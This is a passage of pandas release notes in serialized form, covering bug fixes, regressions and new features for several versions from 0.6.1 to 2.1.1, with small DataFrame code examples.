:func:`read_csv` silently ignoring errors when failing to create a memory-mapped file (:issue:`44766`)\n- Bug in :func:`read_csv` when passing a ``tempfile.SpooledTemporaryFile`` opened in binary mode (:issue:`44748`)\n- Bug in :func:`read_json` raising ``ValueError`` when attempting to parse json strings containing \"://\" (:issue:`36271`)\n- Bug in :func:`read_csv` when ``engine=\"c\"`` and ``encoding_errors=None`` which caused a segfault (:issue:`45180`)\n- Bug in :func:`read_csv` an invalid value of ``usecols`` leading to an unclosed file handle (:issue:`45384`)\n- Bug in :meth:`DataFrame.to_json` fix memory leak (:issue:`43877`)\n\nPeriod\n^^^^^^\n- Bug in adding a :class:`Period` object to a ``np.timedelta64`` object incorrectly raising ``TypeError`` (:issue:`44182`)\n- Bug in :meth:`PeriodIndex.to_timestamp` when the index has ``freq=\"B\"`` inferring ``freq=\"D\"`` for its result instead of ``freq=\"B\"`` (:issue:`44105`)\n- Bug in :class:`Period` constructor incorrectly allowing ``np.timedelta64(\"NaT\")`` (:issue:`44507`)\n- Bug in :meth:`PeriodIndex.to_timestamp` giving incorrect values for indexes with non-contiguous data (:issue:`44100`)\n- Bug in :meth:`Series.where` with ``PeriodDtype`` incorrectly raising when the ``where`` call should not replace anything (:issue:`45135`)\n\nPlotting\n^^^^^^^^\n- When given non-numeric data, :meth:`DataFrame.boxplot` now raises a ``ValueError`` rather than a cryptic ``KeyError`` or ``ZeroDivisionError``, in line with other plotting functions like :meth:`DataFrame.hist` (:issue:`43480`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n- Bug in :meth:`SeriesGroupBy.apply` where passing an unrecognized string argument failed to raise ``TypeError`` when the underlying ``Series`` is empty (:issue:`42021`)\n- Bug in :meth:`Series.rolling.apply`, :meth:`DataFrame.rolling.apply`, :meth:`Series.expanding.apply` and :meth:`DataFrame.expanding.apply` with ``engine=\"numba\"`` where ``*args`` were being cached with the user passed function (:issue:`42287`)\n- Bug in :meth:`.DataFrameGroupBy.max`, :meth:`.SeriesGroupBy.max`, :meth:`.DataFrameGroupBy.min`, and :meth:`.SeriesGroupBy.min` with nullable integer dtypes losing precision (:issue:`41743`)\n- Bug in :meth:`DataFrame.groupby.rolling.var` would calculate the rolling variance only on the first group (:issue:`42442`)\n- Bug in :meth:`.DataFrameGroupBy.shift` and :meth:`.SeriesGroupBy.shift` that would return the grouping columns if ``fill_value`` was not ``None`` (:issue:`41556`)\n- Bug in :meth:`SeriesGroupBy.nlargest` and :meth:`SeriesGroupBy.nsmallest` would have an inconsistent index when the input :class:`Series` was sorted and ``n`` was greater than or equal to all group sizes (:issue:`15272`, :issue:`16345`, :issue:`29129`)\n- Bug in :meth:`pandas.DataFrame.ewm`, where non-float64 dtypes were silently failing (:issue:`42452`)\n- Bug in :meth:`pandas.DataFrame.rolling` operation along rows (``axis=1``) incorrectly omits columns containing ``float16`` and ``float32`` (:issue:`41779`)\n- Bug in :meth:`Resampler.aggregate` did not allow the use of Named Aggregation (:issue:`32803`)\n- Bug in :meth:`Series.rolling` when the :class:`Series` ``dtype`` was ``Int64`` (:issue:`43016`)\n- Bug in :meth:`DataFrame.rolling.corr` when the :class:`DataFrame` columns was a :class:`MultiIndex` (:issue:`21157`)\n- Bug in :meth:`DataFrame.groupby.rolling` when specifying ``on`` and calling ``__getitem__`` would subsequently return incorrect results (:issue:`43355`)\n- Bug in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` with time-based :class:`Grouper` objects incorrectly raising ``ValueError`` in corner cases where the grouping vector contains a ``NaT`` (:issue:`43500`, :issue:`43515`)\n- Bug in :meth:`.DataFrameGroupBy.mean` and :meth:`.SeriesGroupBy.mean` failing with ``complex`` dtype (:issue:`43701`)\n- Bug in :meth:`Series.rolling` and :meth:`DataFrame.rolling` not calculating window bounds correctly for the first row when ``center=True`` and index is decreasing (:issue:`43927`)\n- Bug in :meth:`Series.rolling` and :meth:`DataFrame.rolling` for centered datetimelike windows with uneven nanosecond (:issue:`43997`)\n- Bug in :meth:`.DataFrameGroupBy.mean` and :meth:`.SeriesGroupBy.mean` raising ``KeyError`` when column was selected at least twice (:issue:`44924`)\n- Bug in :meth:`.DataFrameGroupBy.nth` and :meth:`.SeriesGroupBy.nth` failing on ``axis=1`` (:issue:`43926`)\n- Bug in :meth:`Series.rolling` and :meth:`DataFrame.rolling` not respecting right bound on centered datetime-like windows, if the index contain duplicates (:issue:`3944`)\n- Bug in :meth:`Series.rolling` and :meth:`DataFrame.rolling` when using a :class:`pandas.api.indexers.BaseIndexer` subclass that returned unequal start and end arrays would segfault instead of raising a ``ValueError`` (:issue:`44470`)\n- Bug in :meth:`Groupby.nunique` not respecting ``observed=True`` for ``categorical`` grouping columns (:issue:`45128`)\n- Bug in :meth:`.DataFrameGroupBy.head`, :meth:`.SeriesGroupBy.head`, :meth:`.DataFrameGroupBy.tail`, and :meth:`.SeriesGroupBy.tail` not dropping groups with ``NaN`` when ``dropna=True`` (:issue:`45089`)\n- Bug in :meth:`GroupBy.__iter__` after selecting a subset of columns in a :class:`GroupBy` object, which returned all columns instead of the chosen subset (:issue:`44821`)\n- Bug in :meth:`Groupby.rolling` when non-monotonic data passed, fails to correctly raise ``ValueError`` (:issue:`43909`)\n- Bug where grouping by a :class:`Series` that has a ``categorical`` data type and length unequal to the axis of grouping raised ``ValueError`` (:issue:`44179`)\n\nReshaping\n^^^^^^^^^\n- Improved error message when creating a :class:`DataFrame` column from a multi-dimensional :class:`numpy.ndarray` (:issue:`42463`)\n- Bug in :func:`concat` creating :class:`MultiIndex` with duplicate level entries when concatenating a :class:`DataFrame` with duplicates in :class:`Index` and multiple keys (:issue:`42651`)\n- Bug in :meth:`pandas.cut` on :class:`Series` with duplicate indices and non-exact :meth:`pandas.CategoricalIndex` (:issue:`42185`, :issue:`42425`)\n- Bug in :meth:`DataFrame.append` failing to retain dtypes when appended columns do not match (:issue:`43392`)\n- Bug in :func:`concat` of ``bool`` and ``boolean`` dtypes resulting in ``object`` dtype instead of ``boolean`` dtype (:issue:`42800`)\n- Bug in :func:`crosstab` when inputs are categorical :class:`Series`, there are categories that are not present in one or both of the :class:`Series`, and ``margins=True``. Previously the margin value for missing categories was ``NaN``. It is now correctly reported as 0 (:issue:`43505`)\n- Bug in :func:`concat` would fail when the ``objs`` argument all had the same index and the ``keys`` argument contained duplicates (:issue:`43595`)\n- Bug in :func:`concat` which ignored the ``sort`` parameter (:issue:`43375`)\n- Bug in :func:`merge` with :class:`MultiIndex` as column index for the ``on`` argument returning an error when assigning a column internally (:issue:`43734`)\n- Bug in :func:`crosstab` would fail when inputs are lists or tuples (:issue:`44076`)\n- Bug in :meth:`DataFrame.append` failing to retain ``index.name`` when appending a list of :class:`Series` objects (:issue:`44109`)\n- Fixed metadata propagation in :meth:`Dataframe.apply` method, consequently fixing the same issue for :meth:`Dataframe.transform`, :meth:`Dataframe.nunique` and :meth:`Dataframe.mode` (:issue:`28283`)\n- Bug in :func:`concat` casting levels of :class:`MultiIndex` to float if all levels only consist of missing values (:issue:`44900`)\n- Bug in :meth:`DataFrame.stack` with ``ExtensionDtype`` columns incorrectly raising (:issue:`43561`)\n- Bug in :func:`merge` raising ``KeyError`` when joining over differently named indexes with on keywords (:issue:`45094`)\n- Bug in :meth:`Series.unstack` with object doing unwanted type inference on resulting columns (:issue:`44595`)\n- Bug in :meth:`MultiIndex.join()` with overlapping ``IntervalIndex`` levels (:issue:`44096`)\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` results is different ``dtype`` based on ``regex`` parameter (:issue:`44864`)\n- Bug in :meth:`DataFrame.pivot` with ``index=None`` when the :class:`DataFrame` index was a :class:`MultiIndex` (:issue:`23955`)\n\nSparse\n^^^^^^\n- Bug in :meth:`DataFrame.sparse.to_coo` raising ``AttributeError`` when column names are not unique (:issue:`29564`)\n- Bug in :meth:`SparseArray.max` and :meth:`SparseArray.min` raising ``ValueError`` for arrays with 0 non-null elements (:issue:`43527`)\n- Bug in :meth:`DataFrame.sparse.to_coo` silently converting non-zero fill values to zero (:issue:`24817`)\n- Bug in :class:`SparseArray` comparison methods with an array-like operand of mismatched length raising ``AssertionError`` or unclear ``ValueError`` depending on the input (:issue:`43863`)\n- Bug in :class:`SparseArray` arithmetic methods ``floordiv`` and ``mod`` behaviors when dividing by zero not matching the non-sparse :class:`Series` behavior (:issue:`38172`)\n- Bug in :class:`SparseArray` unary methods as well as :meth:`SparseArray.isna` doesn't recalculate indexes (:issue:`44955`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n- Bug in :func:`array` failing to preserve :class:`PandasArray` (:issue:`43887`)\n- NumPy ufuncs ``np.abs``, ``np.positive``, ``np.negative`` now correctly preserve dtype when called on ExtensionArrays that implement ``__abs__, __pos__, __neg__``, respectively. In particular this is fixed for :class:`TimedeltaArray` (:issue:`43899`, :issue:`23316`)\n- NumPy ufuncs ``np.minimum.reduce`` ``np.maximum.reduce``, ``np.add.reduce``, and ``np.prod.reduce`` now work correctly instead of raising ``NotImplementedError`` on :class:`Series` with ``IntegerDtype`` or ``FloatDtype`` (:issue:`43923`, :issue:`44793`)\n- NumPy ufuncs with ``out`` keyword are now supported by arrays with ``IntegerDtype`` and ``FloatingDtype`` (:issue:`45122`)\n- Avoid raising ``PerformanceWarning`` about fragmented :class:`DataFrame` when using many columns with an extension dtype (:issue:`44098`)\n- Bug in :class:`IntegerArray` and :class:`FloatingArray` construction incorrectly coercing mismatched NA values (e.g. ``np.timedelta64(\"NaT\")``) to numeric NA (:issue:`44514`)\n- Bug in :meth:`BooleanArray.__eq__` and :meth:`BooleanArray.__ne__` raising ``TypeError`` on comparison with an incompatible type (like a string). This caused :meth:`DataFrame.replace` to sometimes raise a ``TypeError`` if a nullable boolean column was included (:issue:`44499`)\n- Bug in :func:`array` incorrectly raising when passed a ``ndarray`` with ``float16`` dtype (:issue:`44715`)\n- Bug in calling ``np.sqrt`` on :class:`BooleanArray` returning a malformed :class:`FloatingArray` (:issue:`44715`)\n- Bug in :meth:`Series.where` with ``ExtensionDtype`` when ``other`` is a NA scalar incompatible with the :class:`Series` dtype (e.g. ``NaT`` with a numeric dtype) incorrectly casting to a compatible NA value (:issue:`44697`)\n- Bug in :meth:`Series.replace` where explicitly passing ``value=None`` is treated as if no ``value`` was passed, and ``None`` not being in the result (:issue:`36984`, :issue:`19998`)\n- Bug in :meth:`Series.replace` with unwanted downcasting being done in no-op replacements (:issue:`44498`)\n- Bug in :meth:`Series.replace` with ``FloatDtype``, ``string[python]``, or ``string[pyarrow]`` dtype not being preserved when possible (:issue:`33484`, :issue:`40732`, :issue:`31644`, :issue:`41215`, :issue:`25438`)\n\nStyler\n^^^^^^\n- Bug in :class:`.Styler` where the ``uuid`` at initialization maintained a floating underscore (:issue:`43037`)\n- Bug in :meth:`.Styler.to_html` where the ``Styler`` object was updated if the ``to_html`` method was called with some args (:issue:`43034`)\n- Bug in :meth:`.Styler.copy` where ``uuid`` was not previously copied (:issue:`40675`)\n- Bug in :meth:`Styler.apply` where functions which returned :class:`Series` objects were not correctly handled in terms of aligning their index labels (:issue:`13657`, :issue:`42014`)\n- Bug when rendering an empty :class:`DataFrame` with a named :class:`Index` (:issue:`43305`)\n- Bug when rendering a single level :class:`MultiIndex` (:issue:`43383`)\n- Bug when combining non-sparse rendering and :meth:`.Styler.hide_columns` or :meth:`.Styler.hide_index` (:issue:`43464`)\n- Bug setting a table style when using multiple selectors in :class:`.Styler` (:issue:`44011`)\n- Bugs where row trimming and column trimming failed to reflect hidden rows (:issue:`43703`, :issue:`44247`)\n\nOther\n^^^^^\n- Bug in :meth:`DataFrame.astype` with non-unique columns and a :class:`Series` ``dtype`` argument (:issue:`44417`)\n- Bug in :meth:`CustomBusinessMonthBegin.__add__` (:meth:`CustomBusinessMonthEnd.__add__`) not applying the extra ``offset`` parameter when beginning (end) of the target month is already a business day (:issue:`41356`)\n- Bug in :meth:`RangeIndex.union` with another ``RangeIndex`` with matching (even) ``step`` and starts differing by strictly less than ``step / 2`` (:issue:`44019`)\n- Bug in :meth:`RangeIndex.difference` with ``sort=None`` and ``step<0`` failing to sort (:issue:`44085`)\n- Bug in :meth:`Series.replace` and :meth:`DataFrame.replace` with ``value=None`` and ExtensionDtypes (:issue:`44270`, :issue:`37899`)\n- Bug in :meth:`FloatingArray.equals` failing to consider two arrays equal if they contain ``np.nan`` values (:issue:`44382`)\n- Bug in :meth:`DataFrame.shift` with ``axis=1`` and ``ExtensionDtype`` columns incorrectly raising when an incompatible ``fill_value`` is passed (:issue:`44564`)\n- Bug in :meth:`DataFrame.shift` with ``axis=1`` and ``periods`` larger than ``len(frame.columns)`` producing an invalid :class:`DataFrame` (:issue:`44978`)\n- Bug in :meth:`DataFrame.diff` when passing a NumPy integer object instead of an ``int`` object (:issue:`44572`)\n- Bug in :meth:`Series.replace` raising ``ValueError`` when using ``regex=True`` with a :class:`Series` containing ``np.nan`` values (:issue:`43344`)\n- Bug in :meth:`DataFrame.to_records` where an incorrect ``n`` was used when missing names were replaced by ``level_n`` (:issue:`44818`)\n- Bug in :meth:`DataFrame.eval` where ``resolvers`` argument was overriding the default resolvers (:issue:`34966`)\n- :meth:`Series.__repr__` and :meth:`DataFrame.__repr__` no longer replace all null-values in indexes with \"NaN\" but use their real string-representations. \"NaN\" is used only for ``float(\"nan\")`` (:issue:`45263`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.3.5..v1.4.0\n", "2.1.1": ".. _whatsnew_211:\n\nWhat's new in 2.1.1 (September 20, 2023)\n----------------------------------------\n\nThese are the changes in pandas 2.1.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_211.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :func:`concat` when :class:`DataFrame` 's have two different extension dtypes (:issue:`54848`)\n- Fixed regression in :func:`merge` when merging over a PyArrow string index (:issue:`54894`)\n- Fixed regression in :func:`read_csv` when ``usecols`` is given and ``dtypes`` is a dict for ``engine=\"python\"`` (:issue:`54868`)\n- Fixed regression in :func:`read_csv` when ``delim_whitespace`` is True (:issue:`54918`, :issue:`54931`)\n- Fixed regression in :meth:`.GroupBy.get_group` raising for ``axis=1`` (:issue:`54858`)\n- Fixed regression in :meth:`DataFrame.__setitem__` raising ``AssertionError`` when setting a :class:`Series` with a partial :class:`MultiIndex` (:issue:`54875`)\n- Fixed regression in :meth:`DataFrame.filter` not respecting the order of elements for ``filter`` (:issue:`54980`)\n- Fixed regression in :meth:`DataFrame.to_sql` not roundtripping datetime columns correctly for sqlite (:issue:`54877`)\n- Fixed regression in :meth:`DataFrameGroupBy.agg` when aggregating a DataFrame with duplicate column names using a dictionary (:issue:`55006`)\n- Fixed regression in :meth:`MultiIndex.append` raising when appending overlapping :class:`IntervalIndex` levels (:issue:`54934`)\n- Fixed regression in :meth:`Series.drop_duplicates` for PyArrow strings (:issue:`54904`)\n- Fixed regression in :meth:`Series.interpolate` raising when ``fill_value`` was given (:issue:`54920`)\n- Fixed regression in :meth:`Series.value_counts` raising for numeric data if ``bins`` was specified (:issue:`54857`)\n- Fixed regression in comparison operations for PyArrow backed columns not propagating exceptions correctly (:issue:`54944`)\n- Fixed regression when comparing a :class:`Series` with ``datetime64`` dtype with ``None`` (:issue:`54870`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_211.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed bug for :class:`ArrowDtype` raising ``NotImplementedError`` for fixed-size list (:issue:`55000`)\n- Fixed bug in :meth:`DataFrame.stack` with ``future_stack=True`` and columns a non-:class:`MultiIndex` consisting of tuples (:issue:`54948`)\n- Fixed bug in :meth:`Series.dt.tz` with :class:`ArrowDtype` where a string was returned instead of a ``tzinfo`` object (:issue:`55003`)\n- Fixed bug in :meth:`Series.pct_change` and :meth:`DataFrame.pct_change` showing unnecessary ``FutureWarning`` (:issue:`54981`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_211.other:\n\nOther\n~~~~~\n- Reverted the deprecation that disallowed :meth:`Series.apply` returning a :class:`DataFrame` when the passed-in callable returns a :class:`Series` object (:issue:`52116`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_211.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.1.0..v2.1.1\n", "0.6.1": "\n.. _whatsnew_061:\n\nVersion 0.6.1 (December 13, 2011)\n---------------------------------\n\nNew features\n~~~~~~~~~~~~\n- Can append single rows (as Series) to a DataFrame\n- Add Spearman and Kendall rank correlation\n  options to Series.corr and DataFrame.corr (:issue:`428`)\n- :ref:`Added <indexing.basics.get_value>` ``get_value`` and ``set_value`` methods to\n  Series, DataFrame, and Panel for very low-overhead access (>2x faster in many\n  cases) to scalar elements (:issue:`437`, :issue:`438`). ``set_value`` is capable of\n  producing an enlarged object.\n- Add PyQt table widget to sandbox (:issue:`435`)\n- DataFrame.align can :ref:`accept Series arguments <basics.align.frame.series>`\n  and an :ref:`axis option <basics.df_join>` (:issue:`461`)\n- Implement new :ref:`SparseArray <sparse.array>` and ``SparseList``\n  data structures. SparseSeries now derives from SparseArray (:issue:`463`)\n- :ref:`Better console printing options <basics.console_output>` (:issue:`453`)\n- Implement fast data ranking for Series and\n  DataFrame, fast versions of scipy.stats.rankdata (:issue:`428`)\n- Implement ``DataFrame.from_items`` alternate\n  constructor (:issue:`444`)\n- DataFrame.convert_objects method for :ref:`inferring better dtypes <basics.cast>`\n  for object columns (:issue:`302`)\n- Add :ref:`rolling_corr_pairwise <window.corr_pairwise>` function for\n  computing Panel of correlation matrices (:issue:`189`)\n- Add :ref:`margins <reshaping.pivot.margins>` option to :ref:`pivot_table\n  <reshaping.pivot>` for computing subgroup aggregates (:issue:`114`)\n- Add ``Series.from_csv`` function (:issue:`482`)\n- :ref:`Can pass <window.cov_corr>` DataFrame/DataFrame and\n  DataFrame/Series to rolling_corr/rolling_cov (GH #462)\n- MultiIndex.get_level_values can :ref:`accept the level name <advanced.get_level_values>`\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Improve memory usage of ``DataFrame.describe`` (do not copy data\n  unnecessarily) (PR #425)\n\n- Optimize scalar value lookups in the general case by 25% or more in Series\n  and DataFrame\n\n- Fix performance regression in cross-sectional count in DataFrame, affecting\n  DataFrame.dropna speed\n- Column deletion in DataFrame copies no data (computes views on blocks) (GH\n  #158)\n\n\n\n.. _whatsnew_0.6.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.6.0..v0.6.1\n", "1.0.5": "\n.. _whatsnew_105:\n\nWhat's new in 1.0.5 (June 17, 2020)\n-----------------------------------\n\nThese are the changes in pandas 1.0.5. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_105.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fix regression in :meth:`read_parquet` when reading from file-like objects\n  (:issue:`34467`).\n- Fix regression in reading from public S3 buckets (:issue:`34626`).\n\nNote this disables the ability to read Parquet files from directories on S3\nagain (:issue:`26388`, :issue:`34632`), which was added in the 1.0.4 release,\nbut is now targeted for pandas 1.1.0.\n\n- Fixed regression in :meth:`~DataFrame.replace` raising an ``AssertionError`` when replacing values in an extension dtype with values of a different dtype (:issue:`34530`)\n\n.. _whatsnew_105.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Fixed building from source with Python 3.8 fetching the wrong version of NumPy (:issue:`34666`)\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.0.4..v1.0.5|HEAD\n", "1.4.2": ".. _whatsnew_142:\n\nWhat's new in 1.4.2 (April 2, 2022)\n-----------------------------------\n\nThese are the changes in pandas 1.4.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_142.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.drop` and :meth:`Series.drop` when :class:`Index` had extension dtype and duplicates (:issue:`45860`)\n- Fixed regression in :func:`read_csv` killing python process when invalid file input was given for ``engine=\"c\"`` (:issue:`45957`)\n- Fixed memory performance regression in :meth:`Series.fillna` when called on a :class:`DataFrame` column with ``inplace=True`` (:issue:`46149`)\n- Provided an alternative solution for passing custom Excel formats in :meth:`.Styler.to_excel`, which was a regression based on stricter CSS validation. Examples available in the documentation for :meth:`.Styler.format` (:issue:`46152`)\n- Fixed regression in :meth:`DataFrame.replace` when a replacement value was also a target for replacement (:issue:`46306`)\n- Fixed regression in :meth:`DataFrame.replace` when the replacement value was explicitly ``None`` when passed in a dictionary to ``to_replace`` (:issue:`45601`, :issue:`45836`)\n- Fixed regression when setting values with :meth:`DataFrame.loc` losing :class:`MultiIndex` names if :class:`DataFrame`  was empty before (:issue:`46317`)\n- Fixed regression when rendering boolean datatype columns with :meth:`.Styler` (:issue:`46384`)\n- Fixed regression in :meth:`Groupby.rolling` with a frequency window that would raise a ``ValueError`` even if the datetimes within each group were monotonic (:issue:`46061`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_142.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fix some cases for subclasses that define their ``_constructor`` properties as general callables (:issue:`46018`)\n- Fixed \"longtable\" formatting in :meth:`.Styler.to_latex` when ``column_format`` is given in extended format (:issue:`46037`)\n- Fixed incorrect rendering in :meth:`.Styler.format` with ``hyperlinks=\"html\"`` when the url contains a colon or other special characters (:issue:`46389`)\n- Improved error message in :class:`.Rolling` when ``window`` is a frequency and ``NaT`` is in the rolling axis (:issue:`46087`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_142.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.4.1..v1.4.2\n", "0.9.1": ".. _whatsnew_0901:\n\nVersion 0.9.1 (November 14, 2012)\n---------------------------------\n\n{{ header }}\n\n\nThis is a bug fix release from 0.9.0 and includes several new features and\nenhancements along with a large number of bug fixes. The new features include\nby-column sort order for DataFrame and Series, improved NA handling for the rank\nmethod, masking functions for DataFrame, and intraday time-series filtering for\nDataFrame.\n\nNew features\n~~~~~~~~~~~~\n\n  - ``Series.sort``, ``DataFrame.sort``, and ``DataFrame.sort_index`` can now be\n    specified in a per-column manner to support multiple sort orders (:issue:`928`)\n\n    .. code-block:: ipython\n\n       In [2]: df = pd.DataFrame(np.random.randint(0, 2, (6, 3)),\n          ...:                   columns=['A', 'B', 'C'])\n\n       In [3]: df.sort(['A', 'B'], ascending=[1, 0])\n\n       Out[3]:\n          A  B  C\n       3  0  1  1\n       4  0  1  1\n       2  0  0  1\n       0  1  0  0\n       1  1  0  0\n       5  1  0  0\n\n  - ``DataFrame.rank`` now supports additional argument values for the\n    ``na_option`` parameter so missing values can be assigned either the largest\n    or the smallest rank (:issue:`1508`, :issue:`2159`)\n\n    .. ipython:: python\n\n        df = pd.DataFrame(np.random.randn(6, 3), columns=['A', 'B', 'C'])\n\n        df.loc[2:4] = np.nan\n\n        df.rank()\n\n        df.rank(na_option='top')\n\n        df.rank(na_option='bottom')\n\n\n  - DataFrame has new ``where`` and ``mask`` methods to select values according to a\n    given boolean mask (:issue:`2109`, :issue:`2151`)\n\n        DataFrame currently supports slicing via a boolean vector the same length as the DataFrame (inside the ``[]``).\n        The returned DataFrame has the same number of columns as the original, but is sliced on its index.\n\n        .. ipython:: python\n\n            df = pd.DataFrame(np.random.randn(5, 3), columns=['A', 'B', 'C'])\n\n            df\n\n            df[df['A'] > 0]\n\n        If a DataFrame is sliced with a DataFrame based boolean condition (with the same size as the original DataFrame),\n        then a DataFrame the same size (index and columns) as the original is returned, with\n        elements that do not meet the boolean condition as ``NaN``. This is accomplished via\n        the new method ``DataFrame.where``. In addition, ``where`` takes an optional ``other`` argument for replacement.\n\n        .. ipython:: python\n\n           df[df > 0]\n\n           df.where(df > 0)\n\n           df.where(df > 0, -df)\n\n        Furthermore, ``where`` now aligns the input boolean condition (ndarray or DataFrame), such that partial selection\n        with setting is possible. This is analogous to partial setting via ``.ix`` (but on the contents rather than the axis labels)\n\n        .. ipython:: python\n\n           df2 = df.copy()\n           df2[df2[1:4] > 0] = 3\n           df2\n\n        ``DataFrame.mask`` is the inverse boolean operation of ``where``.\n\n        .. ipython:: python\n\n           df.mask(df <= 0)\n\n  - Enable referencing of Excel columns by their column names (:issue:`1936`)\n\n    .. code-block:: ipython\n\n       In [1]: xl = pd.ExcelFile('data/test.xls')\n\n       In [2]: xl.parse('Sheet1', index_col=0, parse_dates=True,\n                        parse_cols='A:D')\n\n\n  - Added option to disable pandas-style tick locators and formatters\n    using ``series.plot(x_compat=True)`` or ``pandas.plot_params['x_compat'] =\n    True`` (:issue:`2205`)\n  - Existing TimeSeries methods ``at_time`` and ``between_time`` were added to\n    DataFrame (:issue:`2149`)\n  - DataFrame.dot can now accept ndarrays (:issue:`2042`)\n  - DataFrame.drop now supports non-unique indexes (:issue:`2101`)\n  - Panel.shift now supports negative periods (:issue:`2164`)\n  - DataFrame now support unary ~ operator (:issue:`2110`)\n\nAPI changes\n~~~~~~~~~~~\n\n  - Upsampling data with a PeriodIndex will result in a higher frequency\n    TimeSeries that spans the original time window\n\n    .. code-block:: ipython\n\n       In [1]: prng = pd.period_range('2012Q1', periods=2, freq='Q')\n\n       In [2]: s = pd.Series(np.random.randn(len(prng)), prng)\n\n       In [4]: s.resample('M')\n       Out[4]:\n       2012-01   -1.471992\n       2012-02         NaN\n       2012-03         NaN\n       2012-04   -0.493593\n       2012-05         NaN\n       2012-06         NaN\n       Freq: M, dtype: float64\n\n  - Period.end_time now returns the last nanosecond in the time interval\n    (:issue:`2124`, :issue:`2125`, :issue:`1764`)\n\n    .. ipython:: python\n\n        p = pd.Period('2012')\n\n        p.end_time\n\n\n  - File parsers no longer coerce to float or bool for columns that have custom\n    converters specified (:issue:`2184`)\n\n    .. ipython:: python\n\n        import io\n\n        data = ('A,B,C\\n'\n                '00001,001,5\\n'\n                '00002,002,6')\n        pd.read_csv(io.StringIO(data), converters={'A': lambda x: x.strip()})\n\n\nSee the :ref:`full release notes\n<release>` or issue tracker\non GitHub for a complete list.\n\n\n.. _whatsnew_0.9.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.9.0..v0.9.1\n", "0.7.1": ".. _whatsnew_0701:\n\nVersion 0.7.1 (February 29, 2012)\n---------------------------------\n\n{{ header }}\n\n\nThis release includes a few new features and addresses over a dozen bugs in\n0.7.0.\n\nNew features\n~~~~~~~~~~~~\n\n  - Add ``to_clipboard`` function to pandas namespace for writing objects to\n    the system clipboard (:issue:`774`)\n  - Add ``itertuples`` method to DataFrame for iterating through the rows of a\n    dataframe as tuples (:issue:`818`)\n  - Add ability to pass fill_value and method to DataFrame and Series align\n    method (:issue:`806`, :issue:`807`)\n  - Add fill_value option to reindex, align methods (:issue:`784`)\n  - Enable concat to produce DataFrame from Series (:issue:`787`)\n  - Add ``between`` method to Series (:issue:`802`)\n  - Add HTML representation hook to DataFrame for the IPython HTML notebook\n    (:issue:`773`)\n  - Support for reading Excel 2007 XML documents using openpyxl\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n  - Improve performance and memory usage of fillna on DataFrame\n  - Can concatenate a list of Series along axis=1 to obtain a DataFrame (:issue:`787`)\n\n\n\n.. _whatsnew_0.7.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.7.0..v0.7.1\n", "1.3.3": ".. _whatsnew_133:\n\nWhat's new in 1.3.3 (September 12, 2021)\n----------------------------------------\n\nThese are the changes in pandas 1.3.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_133.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :class:`DataFrame` constructor failing to broadcast for defined :class:`Index` and len one list of :class:`Timestamp` (:issue:`42810`)\n- Fixed regression in :meth:`.DataFrameGroupBy.agg` and :meth:`.SeriesGroupBy.agg` incorrectly raising in some cases (:issue:`42390`)\n- Fixed regression in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` where ``nan`` values were dropped even with ``dropna=False`` (:issue:`43205`)\n- Fixed regression in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` which were failing with ``pandas.NA`` (:issue:`42849`)\n- Fixed regression in :meth:`merge` where ``on`` columns with ``ExtensionDtype`` or ``bool`` data types were cast to ``object`` in ``right`` and ``outer`` merge (:issue:`40073`)\n- Fixed regression in :meth:`RangeIndex.where` and :meth:`RangeIndex.putmask` raising ``AssertionError`` when result did not represent a :class:`RangeIndex` (:issue:`43240`)\n- Fixed regression in :meth:`read_parquet` where the ``fastparquet`` engine would not work properly with fastparquet 0.7.0 (:issue:`43075`)\n- Fixed regression in :meth:`DataFrame.loc.__setitem__` raising ``ValueError`` when setting array as cell value (:issue:`43422`)\n- Fixed regression in :func:`is_list_like` where objects with ``__iter__`` set to ``None`` would be identified as iterable (:issue:`43373`)\n- Fixed regression in :meth:`DataFrame.__getitem__` raising error for slice of :class:`DatetimeIndex` when index is non monotonic (:issue:`43223`)\n- Fixed regression in :meth:`.Resampler.aggregate` when used after column selection would raise if ``func`` is a list of aggregation functions (:issue:`42905`)\n- Fixed regression in :meth:`DataFrame.corr` where Kendall correlation would produce incorrect results for columns with repeated values (:issue:`43401`)\n- 